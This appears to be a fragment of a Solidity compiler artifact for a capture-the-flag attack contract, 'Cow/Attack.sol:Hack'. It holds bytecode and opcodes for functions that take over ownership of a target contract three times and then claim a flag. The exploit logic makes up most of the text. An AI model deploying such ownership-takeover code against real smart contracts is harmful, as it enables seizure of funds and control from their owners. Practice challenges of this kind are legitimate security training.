					"object": "608060405273cab0569b20115bb05c694e01900dfd8b9d3774306000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5061082f806100746000396000f3fe60806040526004361061003f5760003560e01c806322f76b0f146100445780633f6f07e91461005b578063aa8303a214610065578063f96339301461006f575b600080fd5b34801561005057600080fd5b50610059610079565b005b6100636101f7565b005b61006d61037e565b005b610077610505565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ae5a2be6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e157600080fd5b505af11580156100f5573d6000803e3d6000fd5b505050503073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631a3743996040518163ffffffff1660e01b8152600401602060405180830381865afa15801561017b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019f919061060b565b73ffffffffffffffffffffffffffffffffffffffff16146101f5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ec90610695565b60405180910390fd5b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166396c50336670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026757600080fd5b505af115801561027b573d6000803e3d6000fd5b50505050503073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631cee5d7a6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610302573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610326919061060b565b73ffffffffffffffffffffffffffffffffffffffff161461037c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161037390610701565b60405180910390fd5b565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ff2eff94670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156103ee57600080fd5b505af1158015610402573d6000803e3d6000fd5b50505050503073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0d124c06040518163ffffffff1660e01b8152600401602060405180830381865afa158015610489573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ad919061060b565b73ffffffffffffffffffffffffffffffffffffffff1614610503576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104fa9061076d565b60405180910390fd5b565b61050d61037e565b6105156101f7565b61051d610079565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b8152600401610574906107d9565b600060405180830381600087803b15801561058e57600080fd5b505af11580156105a2573d6000803e3d6000fd5b50505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006105d8826105ad565b9050919050565b6105e8816105cd565b81146105f357600080fd5b50565b600081519050610605816105df565b92915050565b600060208284031215610621576106206105a8565b5b600061062f848285016105f6565b91505092915050565b600082825260208201905092915050565b7f6469646e2774206861636b206f776e657233207375636365737366756c6c7900600082015250565b600061067f601f83610638565b915061068a82610649565b602082019050919050565b600060208201905081810360008301526106ae81610672565b9050919050565b7f6469646e2774206861636b206f776e657232207375636365737366756c6c7900600082015250565b60006106eb601f83610638565b91506106f6826106b5565b602082019050919050565b6000602082019050818103600083015261071a816106de565b9050919050565b7f6469646e2774206861636b206f776e657231207375636365737366756c6c7900600082015250565b6000610757601f83610638565b915061076282610721565b602082019050919050565b600060208201905081810360008301526107868161074a565b9050919050565b7f676f742069742100000000000000000000000000000000000000000000000000600082015250565b60006107c3600783610638565b91506107ce8261078d565b602082019050919050565b600060208201905081810360008301526107f2816107b6565b905091905056fea2646970667358221220fede1c7ef1549d7657de4078cdddaceafda07b8883955202dfbba4df3bd2b51664736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xCAB0569B20115BB05C694E01900DFD8B9D377430 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x82F DUP1 PUSH2 0x74 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x22F76B0F EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0x3F6F07E9 EQ PUSH2 0x5B JUMPI DUP1 PUSH4 0xAA8303A2 EQ PUSH2 0x65 JUMPI DUP1 PUSH4 0xF9633930 EQ PUSH2 0x6F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0x79 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x63 PUSH2 0x1F7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6D PUSH2 0x37E JUMP JUMPDEST STOP JUMPDEST PUSH2 0x77 PUSH2 0x505 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9AE5A2BE PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1A374399 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x60B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1F5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1EC SWAP1 PUSH2 0x695 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x96C50336 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x267 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x27B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1CEE5D7A PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x302 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x326 SWAP2 SWAP1 PUSH2 0x60B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x37C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x373 SWAP1 PUSH2 0x701 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFF2EFF94 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x402 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0D124C0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x489 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x4AD SWAP2 SWAP1 PUSH2 0x60B JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x503 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4FA SWAP1 PUSH2 0x76D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH2 0x50D PUSH2 0x37E JUMP JUMPDEST PUSH2 0x515 PUSH2 0x1F7 JUMP JUMPDEST PUSH2 0x51D PUSH2 0x79 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6BC344BC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x574 SWAP1 PUSH2 0x7D9 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5D8 DUP3 PUSH2 0x5AD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5E8 DUP2 PUSH2 0x5CD JUMP JUMPDEST DUP2 EQ PUSH2 0x5F3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x605 DUP2 PUSH2 0x5DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x621 JUMPI PUSH2 0x620 PUSH2 0x5A8 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x62F DUP5 DUP3 DUP6 ADD PUSH2 0x5F6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6469646E2774206861636B206F776E657233207375636365737366756C6C7900 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x67F PUSH1 0x1F DUP4 PUSH2 0x638 JUMP JUMPDEST SWAP2 POP PUSH2 0x68A DUP3 PUSH2 0x649 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x6AE DUP2 PUSH2 0x672 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x6469646E2774206861636B206F776E657232207375636365737366756C6C7900 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x6EB PUSH1 0x1F DUP4 PUSH2 0x638 JUMP JUMPDEST SWAP2 POP PUSH2 0x6F6 DUP3 PUSH2 0x6B5 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x71A DUP2 PUSH2 0x6DE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x6469646E2774206861636B206F776E657231207375636365737366756C6C7900 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x757 PUSH1 0x1F DUP4 PUSH2 0x638 JUMP JUMPDEST SWAP2 POP PUSH2 0x762 DUP3 PUSH2 0x721 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x786 DUP2 PUSH2 0x74A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x676F742069742100000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7C3 PUSH1 0x7 DUP4 PUSH2 0x638 JUMP JUMPDEST SWAP2 POP PUSH2 0x7CE DUP3 PUSH2 0x78D JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x7F2 DUP2 PUSH2 0x7B6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 INVALID 0xDE SHR PUSH31 0xF1549D7657DE4078CDDDACEAFDA07B8883955202DFBBA4DF3BD2B51664736F PUSH13 0x63430008110033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "419000",
						"executionCost": "24722",
						"totalCost": "443722"
					},
					"external": {
						"getFlag()": "infinite",
						"hackOwner1()": "infinite",
						"hackOwner2()": "infinite",
						"hackOwner3()": "infinite"
					}
				},
				"methodIdentifiers": {
					"getFlag()": "f9633930",
					"hackOwner1()": "aa8303a2",
					"hackOwner2()": "3f6f07e9",
					"hackOwner3()": "22f76b0f"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 40,
						"contract": "Cow/Attack.sol:Hack",
						"label": "cow",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(ICow)34"
					}
				],
				"types": {
					"t_contract(ICow)34": {
						"encoding": "inplace",
						"label": "contract ICow",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}